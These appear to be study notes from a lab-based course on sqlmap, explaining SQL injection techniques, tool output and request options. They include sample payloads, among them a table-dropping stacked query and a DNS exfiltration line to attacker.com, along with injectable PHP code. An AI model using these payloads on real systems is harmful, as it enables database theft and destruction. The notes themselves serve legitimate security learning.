
## SQLMap Overview 

sqlmap is an open-source pen testing tool that automates the detection and exploitation of sql injection flaws 

`python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5`

contains options and switches for: 
- target connection 
- enumeration
- database content retrieval 
- injection detection 
- optimization
- file system access
- fingerprinting 
- protection detection and bypass using "tamper" scripts
- execution of the OS commands 

you can install with: 

`sudo apt install sqlmap`

manual installation: 

`git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev'

then you can run sqlmap with: 

`python sqlmap.py`

there are many supported databases: 

![](../Images/Pasted%20image%2020240105185232.png)

you can see the supported SQL injections with `sqlmap -hh`

BEUSTQ technique characters: 
- `B` = boolean-based blind 
- `E` = Error-based 
- `U` = union query-based 
- `S` = stacked queries 
- `T` = time-based blind 
- `Q` = inline queries

### Boolean-based blind SQL injection 

`AND 1=1`

sqlmap exploits boolean-based blind sql injection through the differentiation of TURE from FALSE query results   
retrieving 1 byte of info per request  
differentiation is based on server responses to see if it returned TRUE of FALSE   
could be from raw response content, HTTP codes, page titles, filtered text, etc. 

TRUE = generally based on responses having none or small difference to regular server response  
FALSE = substantial differences form regular server response  

boolean-based blind SQL injection is most common SQLi type in web apps 

### Error-based SQL injection 

`AND GTID_SUBSET(@@version,0)`

if the database management system (DBMS) errors are being returned in the server response then there is a chance that they can be used to carry the results for requested queries  
so you can target functions that cause known misbehaviors with specific payloads  

sqlmap has the biggest list of these payloads and covers error-based SQL injections for: 

- MySQL 
- microsoft SQL server 
- IBM DB2 
- PostgreSQL 
- Sybase 
- Firebird
- Oracle 
- Vertica
- MonetDB

error-based SQLi are considered to be the fastest, except for UNION query-based, because it can retrieve a limited amount of data called "chunks" through each request 

### UNION query-based

`UNION ALL SELECT 1, @@version,3`

using UNION makes is possible to extend the original (vulnerable) query with the injected statements' results   
attacker can get additional results from the injected statements within the page response itself  

considered the fastest because the attacker could pull the content of the entire database with a single request 

### Stacked queries 

`; DROP TABLE users`

stacking queries also known as piggy-backing is injecting additional SQL statements after the vulnerable one 

if there is a requirement for running non-query statements like INSERT, UPDATE, DELETE then stacking must be supported by the vulnerable platform (microsoft sql server and postgresql support by default) 

SQLmap can use such vulnerabilities to run non-query statements executed in advanced features like execution of OS commands and data retrieval like time-based blind sqli types

### Time-based blind SQL injection 

`AND 1=IF(2>1,SLEEP(5),0)`

similar to boolean-based blind sql injection but the response time is used as the source for the differentiation between TRUE and FALSE 

TRUE = noticeable difference between response time of regular server response  
FALSE = response time indistinguishable from regular response times 

much slower than boolean-based sqli since TRUE queries would delay the server response  
usually used when boolean-based is not applicable  
for example, when statement is a non-query 

### Inline queries 

`SELECT (SELECT @@version) from`

embeds a query within the original query  
uncommon because it requires the web app to be written in a certain way  

### Out-of-band SQL injection 

`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`

one of the most advanced types of sqli  
used in cases where all other types are either unsupported or too slow  
sqlmap supports these through DNS exfiltration where requested queries are retrieved through DNS traffic  

running sqlmap on the dns server for the domain under control (.attacker.com) allows sqlmap to perform the attack by forcing the server to request non-existent subdomains (foo.attacker.com) where foo would be the SQL response we want  
sqlmap collects the erroring DNS requests and collects the foo part to form the entire sql response 

## Getting Started with SQLMap 

in a simple scenario, there is a web page that accepts user input via a GET parameter (ex: id)  
you want to test if the web page is affected by a SQL injection  
if so then you will want to exploit it and get as much info as you can  
possibly even try to access the underlying file system and execute OS commands 

some vulnerable php code could look like: 

```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

there will be an error reported as part of the web-server response in case of any sql query problems  
these will make SQLi detection easier

basic command on a url would look like: 

`sqlmap -u "http://www.example.com/vuln.php?id=1 --batch`

## SQLMap Output Description 

sqlmap output shows exactly what vulnerabilities sqlmap is exploiting  

there are many common messages found from a can of SQLMap 
### URL content is stable

"target URL content is stable"

no major changes between responses in case of continuous identical requests 

in the event of stable responses, it is easier to spot the difference caused by SQLi attempts 

### Parameter appears to be dynamic

"GET parameter 'id' appears to be dynamic"

always desired for parameter to be dynamic = any changes made to its value results in a change in its response; parameter may be linked to a database  

if it is static then it could be an indicator that the value is not processed by the target 

### Parameter might be injectable 

"heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DMBS: 'MySQL')"

in this case there was a DBMS error that looks like it could be from MySQL which means that the target could be injectable with MySQL 

### Parameter might be vulnerable to XSS attacks 

"heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"

sqlmap also does quick XSS scans 

### Back-end DMBS is '...'

"it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DMBSes? Y/n" 

this will show up if it is clear that the target is using a specific DBMS 

### Level/risk values

"for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? Y/n"

if it is clear that there is a specific DBMS being used then it is also possible to extend the tests for that same specific DBMS beyond the basic tests  

if it isn't known what DBMS is being used then it will only use the top payloads 

### Reflective values found 

"reflective values found and filtering out"

warning that parts of the used payload are found in the response  
this could cause problems to automation tools, so SQLMap filters it out 

### Parameter appears to be injectable 

"GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"

could be injectable  
boolean-based and time-based blinds are likely to have false-positives but SQLmap will try to filter these at the end 

"with --string="luther"" = recognized and used the appearance of constant string value luther in the response for distinguishing TRUE and FALSE responses  
this means that there will be no need for advanced internal mechanisms like dynamicity/reflection or fuzzy comparison of responses which can't be considered as false-positive 
### Time-based comparison statistical model 

"time-based comparison requires a larger statistical model, please wait.... (done)"

sqlmap uses stat model for the recognition of regular response times  
this requires a sufficient number of regular response times so that it can distinguish between deliberate delay even in the high-latency network environments 

### Extending UNION query injection technique tests 

"automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"

require a lot more requests for successful recognition of usable payload than other SQLi  
sqlmap will typically cap the number of requests to lower testing time  
but if there is a good chance that the target is vulnerable, meaning a vulnerability was possibly found, then it extends the cap 

### Technique appears to be usable 

"'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"

as a heuristic check for UNION-query types, sqlmap will use ORDER BY before actual UNION payloads are sent  
if this works then sqlmap can recognize the correct number of required UNION columns by conducting the binary-search approach 

### Parameter is vulnerable 

"GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? y/N"

there was indeed a parameter found to be vulnerable, and you can opt to take this as the first one and exit or continue searching for all vulnerabilities 

### Sqlmap identified injection points 

"sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"

after this is a list of all injection points with type, title, and payloads  

will only list for findings that are provably exploitable 

### Data logged to text files

"fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"

shows where all logs, sessions, and output data was stored for the target 

if an injection point is found, all details for future runs are stored in the same directory  
sqlmap tries to reduce the required target requests as much as possible, depending on the session files data 

## Running SQLMap on an HTTP Request 

there are many options to set up an HTTP request before usage  
improper cookie values, over complicated setups, or improper declaration of POST data will prevent correct detection of SQLl  

one of the best way to set up a SQLMap request is using the copy cURL feature in the browser network tab 

you can copy the cURL command and simply replace curl with sqlmap to get a working command: 

```shell
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

when providing data for testing in SQLmap, there needs to either be a parameter that could be accessed for SQLi or specialized options/switches for auto parameter finding like `--crawl` or `-g`

### GET/POST requests 

typically GET parameters are provided with the `-u` or `--url` options  
for testing POST data the `--data` flag is used 

`sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`

if you know that there is only one parameter that you want to test you can use `-p` or a `*` after the parameter like: 

`'uid=1*&name=test`

### Full HTTP requests 

if we need to do more complex HTTP requests with lots of header values and elongated POST body, we can use `-r`  
this will be used to provide a request file containing the whole request  
you can capture these types of requests with proxy apps like Burp 

for example: 

```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

you can either manually copy the request from within burp and write to file or right click the request in burp and choose copy to file 

you can do this through the browser by doing `Copy > Copy Request Headers` 

`sqlmap -r req.txt`

similar to how we use `--data` we can specify the parameter we want to inject in with an `*`: 

`/?id=*`

### Custom SQLMap Requests 

many options to customize for specific request options

if you needed to specify the session cookie value you could use `--cookie`: 

`sqlmap ... --cookie='newcookievalue'`

or using the `-H` or `--header`: 

`sqlmap ... -H='Cookie:PHPSESSID=abcdeqwerasdfasdf'`

we can apply the same to other options like `--host`, `--referer`, and `-A/--user-agent` which are also used to specify the header values 

`--random-agent` randomly selects User-agent header values  
this is important because more and more protections recognize and block SQLMap's User-agent value `User-agent:sqlmap/1.4.9.12#dev (http://sqlmap.org)`  
can also use `--mobile` to imitate the smartphone 

sqlmap by default only targets HTTP parameters but can also choose to test the headers  
easiest way is to specify the custom injection mark after the header's value  
`--cookie=id1*`  
this applies to any other part of the request 

can also specify different methods like `--method PUT`

### Custom HTTP requests

sqlmap also supports JSON formatted (`{"id":1}`) and XML formatted (`<element><id>1</id></element>`) http requests 

no strict restraints on how the parameter values are stored inside  
if POST body is simple and short you can just use `--data`  
however we can again use `-r` for longer ones 

### Example Queries 

with our target IP and port we can see a page with different exercises: 

![](../Images/Pasted%20image%2020240107184822.png)

for this section lets start with case 2: 

![](../Images/Pasted%20image%2020240107184903.png)

we have a text field and submit button that we want to inject on with a POST request 

lets grab the POST request and use it as our command: 

![](../Images/Pasted%20image%2020240107185106.png)

we know that we want to inject on the id parameter so I use `*` to specify it  
I also use `--batch` and `--dump` to get output files  

we get our first flag: 

![](../Images/Pasted%20image%2020240107185323.png)

for case 3 we are looking to inject on the id cookie value: 

![](../Images/Pasted%20image%2020240107185458.png)

for this I add an `*` to the cookie field for id:

![](../Images/Pasted%20image%2020240107185610.png)

we can then find the flag for case 3: 

![](../Images/Pasted%20image%2020240107185844.png)

